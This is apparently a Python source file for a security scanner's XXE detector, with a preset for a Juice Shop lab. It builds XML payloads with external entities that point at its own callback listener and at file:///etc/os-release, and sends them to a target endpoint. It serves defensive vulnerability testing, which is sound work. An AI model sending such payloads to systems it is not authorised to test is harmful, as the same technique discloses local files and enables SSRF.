"""XML External Entity (XXE) injection detector.

Generic and evidence-based, same philosophy as the other detectors — but XXE
needs a different proof technique than a marker echoed in the same response
(command_injection) or a login differential (weak_auth): the safe way to
prove a parser resolves *external* entities, without ever reading real or
sensitive data off the target, is to make it resolve a harmless resource and
observe whether that resolution actually happened. Two independent, safe
probes are run — either signal alone is sufficient:

  1. Out-of-band callback: submit XML with a DOCTYPE declaring an external
     entity whose SYSTEM identifier is a URL served by a tiny local HTTP
     listener this detector starts itself (stdlib asyncio, ephemeral port).
     If the listener receives a request, the target's parser made a network
     call to a URL it was only ever given inside the XML — proof positive,
     and nothing sensitive was ever involved since the resource is ours.
     Some XML libraries only resolve `file://` SYSTEM identifiers and never
     make network calls at all (this is the common case in practice), so
     this probe alone under-detects — hence probe 2.

  2. Harmless local file reflection: submit a second document whose external
     entity points at `file:///etc/os-release` (configurable) — present on
     virtually every Linux container and containing nothing but public OS
     branding info, never sensitive data. If a distinctive fingerprint from
     that file's known content (`PRETTY_NAME=` by default) shows up in the
     response, the parser resolved and echoed it back (e.g. in a validation
     error that includes the parsed document). This directly satisfies the
     plan's acceptance criteria: "confirms XXE only when processing of a
     harmless controlled external entity/resource is demonstrated" — the
     file is deliberately a non-sensitive one, never a real system-sensitive
     path like /etc/passwd.

There is no generic way to auto-discover "the XML endpoint" the way a login
form or an injectable field can be discovered from HTML, so a target must
supply one (or match a bundled lab preset). The bundled Juice Shop lab
container's deprecated B2B file-upload endpoint is a known target for this
class of test — see LAB_PRESETS — but any target can be pointed at via
`xml_endpoint` (+ `request_style`: "raw" | "json_field" | "multipart") in
ScanContext.extra (populated from Target.scan_config).

The callback listener defaults to being reachable at the backend container's
own Docker Compose service name (`backend`), which the bundled lab
containers can resolve and reach over the shared `vulnvista_net` network —
override `callback_host` for targets reachable at a different address.
"""

from __future__ import annotations

import asyncio
import secrets
from dataclasses import dataclass
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx

from app.scanners.base import BaseDetector, DetectorResult, ScanContext

GENERIC_DEFAULTS: dict[str, Any] = {
    "request_timeout": 15.0,
    "oob_wait_seconds": 3.0,
    "request_style": "raw",
    "callback_host": "backend",
    # A file present on virtually every Linux container, containing nothing
    # but public OS branding info — never sensitive data. Set either to a
    # falsy value in scan config to skip this probe.
    "local_file_path": "/etc/os-release",
    "local_file_fingerprint": "PRETTY_NAME=",
}

# Preset for the bundled Juice Shop lab container's deprecated B2B file
# upload endpoint (routes/fileUpload.ts -> handleXmlUpload): a multipart
# upload accepting a .xml file, parsed with entity resolution enabled before
# being rejected with a 410. No authentication required. Note: Juice Shop
# disables this code path by default whenever it detects it's running in a
# container (NODE_ENV=unsafe or a safetyOverride config re-enables it) — see
# lab/docker-compose.yml.
LAB_PRESETS: dict[str, dict[str, Any]] = {
    "juice-shop": {
        "xml_endpoint": "/file-upload",
        "request_style": "multipart",
        "upload_field": "file",
        "upload_filename": "probe.xml",
    },
}
LAB_PRESETS["vulnvista_juice_shop"] = LAB_PRESETS["juice-shop"]


class DetectorError(Exception):
    """A detector could not run to completion — carries a human-readable reason
    that is surfaced to the user (distinct from a raw transport error)."""


def build_payload(callback_url: str) -> str:
    """The XML document submitted to the target: a DOCTYPE declaring a
    general external entity pointing at our own canary listener, referenced
    once from the document body so any entity-resolving parser fetches it."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE vulnvista [<!ENTITY xxe SYSTEM "{callback_url}">]>\n'
        "<vulnvista><probe>&xxe;</probe></vulnvista>"
    )


class _CanaryServer:
    """A minimal, stdlib-only HTTP responder for exactly one purpose: prove a
    remote party fetched it. Not a real HTTP implementation — just enough
    parsing to drain the request and reply with a fixed marker body."""

    def __init__(self, marker: str) -> None:
        self.marker = marker
        self.hit_count = 0
        self.hit_event = asyncio.Event()
        self._server: asyncio.Server | None = None

    async def __aenter__(self) -> _CanaryServer:
        try:
            self._server = await asyncio.start_server(self._handle, host="0.0.0.0", port=0)
        except OSError as exc:
            raise DetectorError(f"Could not start the local XXE canary listener: {exc}") from exc
        return self

    async def __aexit__(self, *exc_info: object) -> None:
        if self._server is not None:
            self._server.close()
            await self._server.wait_closed()

    @property
    def port(self) -> int:
        assert self._server is not None and self._server.sockets
        return self._server.sockets[0].getsockname()[1]

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            await asyncio.wait_for(reader.readline(), timeout=5.0)
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=2.0)
                if not line or line in (b"\r\n", b"\n"):
                    break
            self.hit_count += 1
            self.hit_event.set()
            body = self.marker.encode()
            writer.write(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            await writer.drain()
        except (TimeoutError, ConnectionError):
            pass
        finally:
            writer.close()


@dataclass
class Decision:
    detected: bool
    validation_status: str
    confidence: str
    reason: str


def classify(oob_hit: bool, in_band_reflected: bool) -> Decision:
    """Turn the two raw signals into a validation verdict.

    Kept pure (no I/O) so the decision policy can be unit-tested directly.
    """
    if oob_hit and in_band_reflected:
        return Decision(
            True, "CONFIRMED", "HIGH",
            "the target's parser both fetched the external entity's URL and "
            "reflected its resolved content back in the response",
        )
    if oob_hit:
        return Decision(
            True, "CONFIRMED", "HIGH",
            "the target's parser fetched the external entity's URL — a network "
            "call it could only have made by resolving the SYSTEM identifier",
        )
    if in_band_reflected:
        return Decision(
            True, "CONFIRMED", "HIGH",
            "the external entity's resolved content was reflected back in the "
            "target's response",
        )
    return Decision(
        False, "NOT_DETECTED", "LOW",
        "the external entity was not resolved — no callback was received and "
        "no marker was reflected",
    )


class XXEDetector(BaseDetector):
    detector_id = "xxe"
    name = "XML External Entity (XXE) Injection"
    vulnerability_type = "xxe"
    supported_targets = ["webapp"]

    async def check(self, context: ScanContext) -> DetectorResult:
        parsed = urlparse(context.base_url)
        host = parsed.hostname or ""
        base = f"{parsed.scheme}://{parsed.netloc}"
        cfg = {**GENERIC_DEFAULTS, **LAB_PRESETS.get(host, {}), **context.extra}
        source = (
            "explicit configuration" if "xml_endpoint" in context.extra
            else "lab preset" if host in LAB_PRESETS
            else None
        )

        if not cfg.get("xml_endpoint"):
            return self._error_result(
                context,
                "No XML-accepting endpoint is known for this target. Provide an explicit "
                "'xml_endpoint' (and 'request_style': 'raw' | 'json_field' | 'multipart', plus "
                "'json_field' or 'upload_field' as needed) in the target's scan configuration.",
            )
        endpoint = urljoin(f"{base}/", cfg["xml_endpoint"].lstrip("/"))
        marker = f"VULNVISTA-XXE-{secrets.token_hex(4)}"

        try:
            async with httpx.AsyncClient(
                timeout=cfg["request_timeout"],
                follow_redirects=True,
                cookies=cfg.get("cookies", {}),
                headers=cfg.get("headers", {}),
            ) as client:
                async with _CanaryServer(marker) as canary:
                    callback_url = (
                        f"http://{cfg['callback_host']}:{canary.port}/{secrets.token_hex(3)}"
                    )
                    oob_payload = build_payload(callback_url)
                    oob_resp = await self._submit(client, endpoint, oob_payload, cfg)

                    if oob_resp.status_code == 404:
                        raise DetectorError(
                            f"{endpoint} returned 404 Not Found. The configured/preset "
                            "'xml_endpoint' may not match this target's actual API — provide "
                            "an explicit override in the target's scan configuration."
                        )

                    oob_hit = False
                    try:
                        await asyncio.wait_for(
                            canary.hit_event.wait(), timeout=cfg["oob_wait_seconds"]
                        )
                        oob_hit = True
                    except TimeoutError:
                        pass

                local_file_path = cfg.get("local_file_path")
                local_file_fingerprint = cfg.get("local_file_fingerprint")
                local_file_reflected = False
                if local_file_path and local_file_fingerprint:
                    local_resp = await self._submit(
                        client, endpoint, build_payload(f"file://{local_file_path}"), cfg
                    )
                    local_file_reflected = local_file_fingerprint in local_resp.text

            in_band_reflected = (marker in oob_resp.text) or local_file_reflected
            decision = classify(oob_hit, in_band_reflected)
            evidence = {
                "xml_endpoint": endpoint,
                "endpoint_discovery": source or "auto",
                "request_style": cfg["request_style"],
                "callback_url": callback_url,
                "oob_hit": oob_hit,
                "oob_hit_count": canary.hit_count,
                "local_file_path": local_file_path,
                "local_file_reflected": local_file_reflected,
                "in_band_reflected": in_band_reflected,
                "response_status": oob_resp.status_code,
            }
            return self._result(endpoint, decision, evidence)
        except DetectorError as exc:
            return self._error_result(context, str(exc))
        except httpx.HTTPError as exc:
            return self._error_result(
                context, f"Could not reach the target ({type(exc).__name__}: {exc})."
            )

    async def _submit(
        self, client: httpx.AsyncClient, endpoint: str, payload: str, cfg: dict[str, Any]
    ) -> httpx.Response:
        style = cfg["request_style"]
        if style == "raw":
            return await client.post(
                endpoint, content=payload, headers={"Content-Type": "application/xml"}
            )
        if style == "json_field":
            if not cfg.get("json_field"):
                raise DetectorError(
                    "request_style is 'json_field' but no 'json_field' was supplied."
                )
            return await client.post(endpoint, json={cfg["json_field"]: payload})
        if style == "multipart":
            field = cfg.get("upload_field", "file")
            filename = cfg.get("upload_filename", "order.xml")
            return await client.post(endpoint, files={field: (filename, payload, "text/xml")})
        raise DetectorError(
            f"Unknown request_style '{style}'. Use 'raw', 'json_field', or 'multipart'."
        )

    def _result(
        self, endpoint: str, decision: Decision, evidence: dict[str, Any]
    ) -> DetectorResult:
        summary = (
            f"{decision.reason} (endpoint {evidence['endpoint_discovery']}, "
            f"style={evidence['request_style']}). oob_hit={evidence['oob_hit']}, "
            f"in_band_reflected={evidence['in_band_reflected']}."
        )
        return DetectorResult(
            detector=self.detector_id,
            vulnerability=self.name,
            detected=decision.detected,
            validation_status=decision.validation_status,
            severity="CRITICAL" if decision.detected else "INFO",
            confidence=decision.confidence,
            endpoint=endpoint,
            parameter=None,
            description=(
                "The target's XML parser resolves externally declared "
                "entities: a DOCTYPE naming a SYSTEM URL under this "
                "detector's control was fetched by the target and/or its "
                "resolved content was reflected back, proving the parser "
                "does not disable external entity resolution. In a real "
                "attack the same mechanism can reach internal network "
                "services (SSRF) or disclose local files."
            ),
            evidence_summary=summary,
            evidence=evidence,
            remediation=(
                "Disable DTD processing and external entity resolution in "
                "the XML parser (e.g. XMLConstants.FEATURE_SECURE_PROCESSING "
                "in Java, libxml2's noent/resolve_entities off, defusedxml "
                "in Python), or switch to a data format that has no DTD "
                "concept at all (JSON) wherever the schema allows it."
            ),
            cwe="CWE-611",
            cvss_score=7.5 if decision.detected else 0.0,
            owasp_category="A05:2021 - Security Misconfiguration",
        )

    def _error_result(self, context: ScanContext, message: str) -> DetectorResult:
        return DetectorResult(
            detector=self.detector_id,
            vulnerability=self.name,
            detected=False,
            validation_status="ERROR",
            severity="INFO",
            confidence="LOW",
            endpoint=context.base_url,
            parameter=None,
            description="Detector could not complete against the target.",
            evidence_summary=f"Scan error: {message}",
            evidence={"error": message},
            cwe="CWE-611",
            owasp_category="A05:2021 - Security Misconfiguration",
        )

##
# import json
# import os

# async def _main() -> None:
#     """Run a manual XXE check against an authorized target."""
#     target_url = os.getenv("XXE_TARGET_URL", "http://juice-shop:3000")

#     result = await XXEDetector().check(
#         ScanContext(
#             target_id="manual-xxe",
#             base_url=target_url,
#             timeout_seconds=300,
#         )
#     )

#     print(json.dumps(result.__dict__, indent=2, default=str))


# if __name__ == "__main__":
#     asyncio.run(_main())